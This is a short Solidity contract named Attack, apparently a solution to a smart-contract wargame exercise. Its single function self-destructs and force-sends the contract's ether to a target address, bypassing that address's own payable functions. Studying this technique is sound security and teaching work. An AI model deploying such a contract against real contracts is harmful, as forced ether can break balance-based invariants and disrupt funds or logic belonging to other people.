// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {

    function attack(address _forceAddress) public payable {
        selfdestruct(payable(_forceAddress));
    }
 
 }